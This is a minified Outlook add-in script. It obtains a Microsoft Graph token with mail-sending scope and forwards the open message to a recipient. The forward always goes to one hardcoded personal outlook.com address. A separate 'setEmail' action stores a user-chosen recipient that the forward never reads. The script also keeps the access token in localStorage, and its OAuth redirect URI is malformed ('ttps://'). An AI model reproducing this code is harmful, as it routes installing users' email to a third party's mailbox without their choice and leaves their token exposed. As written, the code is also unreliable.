!(function () {
  var e, t, o;
  Office.onReady(function (e) {
    e.host, Office.HostType.Outlook;
  }),
    Office.actions.associate("sendEmail", function (i) {
      Office.context.ui.displayDialogAsync(
        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=73ec89d0-b047-4eae-a554-9ea9e31898c3&response_type=token&redirect_uri=ttps://nadeemashfaq.github.io/emailforword/assets/redirectPage.html&scope=user.read+mail.send+openid+profile+email&response_mode=fragment&state=12345&nonce=678910",
        { height: 80, width: 40 },
        function (a) {
          (o = a.value).addEventHandler(Office.EventType.DialogMessageReceived, function (a) {
            o.close(),
              (e = a.message),
              window.localStorage.setItem("token", a.message),
              (t = (t = Office.context.mailbox.item.itemId).replaceAll("/", "-")),
              fetch("https://graph.microsoft.com/v1.0/me/messages/" + t + "/forward", {
                method: "POST",
                headers: { Authorization: "Bearer " + e, "Content-Type": "application/json" },
                body: JSON.stringify({
                  toRecipients: [{ emailAddress: { address: "nadeemshfaq141117@outlook.com" } }],
                }),
              })
                .then(function (e) {
                  if (!e.ok) throw (i.completed(), new Error("Failed to forward email"));
                  i.completed();
                })
                .catch(function (e) {
                  i.completed(), console.error("Error forwarding email:", e);
                }),
              i.completed();
          });
        }
      );
    }),
    Office.actions.associate("setEmail", function (e) {
      !(function (e) {
        var t;
        Office.context.ui.displayDialogAsync(
          "https://localhost:3000/assets/setemail.html",
          { height: 80, width: 40 },
          function (o) {
            (t = o.value).addEventHandler(Office.EventType.DialogMessageReceived, function (o) {
              t.close();
              var i = o.message;
              window.localStorage.setItem("email", i), e.completed();
            });
          }
        );
      })(e);
    });
})();
//# sourceMappingURL=commands.js.map
